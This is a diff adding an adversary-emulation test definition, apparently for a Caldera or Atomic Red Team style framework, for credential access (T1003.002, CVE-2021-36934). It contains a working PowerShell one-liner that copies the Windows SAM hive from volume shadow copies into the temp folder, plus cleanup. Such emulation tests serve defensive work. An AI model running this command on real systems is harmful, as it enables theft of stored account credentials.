@@ -1,0 +1,15 @@
+- id: 07a92ed9-83b2-5748-99c4-a9baa85c11ed
+  name: Soumaia ART Tests - dump volume shadow copy hives with System.IO.File
+  description: Dump hives from volume shadow copies with System.IO.File. [CVE-2021-36934](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-36934)
+  tactic: credential-access
+  technique:
+    attack_id: T1003.002
+    name: 'OS Credential Dumping: Security Account Manager'
+  platforms:
+    windows:
+      psh:
+        command: "1..10 | % { \n try { [System.IO.File]::Copy(\"\\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy$_\\Windows\\System32\\config\\SAM\" , \"$env:TEMP\\SAMvss$_\", \"true\") } catch {}\n ls \"$env:TEMP\\SAMvss$_\" -ErrorAction Ignore\n}"
+        cleanup: |-
+          1..10 | % {
+            rm "$env:TEMP\SAMvss$_" -ErrorAction Ignore
+          }
